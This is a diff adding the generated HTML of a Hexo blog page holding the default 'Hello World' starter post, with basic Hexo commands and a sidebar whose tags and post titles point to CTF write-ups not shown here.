+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/03/24/hello-world/" data-id="cuidt41sH7c1f5smgzxdSFtpK" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0xGame/" rel="tag">0xGame</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ethernaut/" rel="tag">Ethernaut</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hack-the-box/" rel="tag">hack_the_box</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/test/" rel="tag">test</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" rel="tag">极客大挑战</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/0xGame/" style="font-size: 10px;">0xGame</a> <a href="/tags/Ethernaut/" style="font-size: 13.33px;">Ethernaut</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/hack-the-box/" style="font-size: 16.67px;">hack_the_box</a> <a href="/tags/test/" style="font-size: 10px;">test</a> <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" style="font-size: 10px;">极客大挑战</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/03/">March 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/03/24/My-New-Post/">My New Post</a>
+          </li>
+        
+          <li>
+            <a href="/2026/03/24/3%E6%9C%88%E4%BB%BD%E8%80%83%E6%A0%B8%E8%B5%9B/">26三月份考核赛</a>
+          </li>
+        
+          <li>
+            <a href="/2026/03/24/9%E6%9C%88%E8%80%83%E6%A0%B8%E8%B5%9B/">25九月份考核赛</a>
+          </li>
+        
+          <li>
+            <a href="/2026/03/24/0xGame/">25 0xGame</a>
+          </li>
+        
+          <li>
+            <a href="/2026/03/24/blockchain_honor_among_thieves/">honor_among_thieves</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
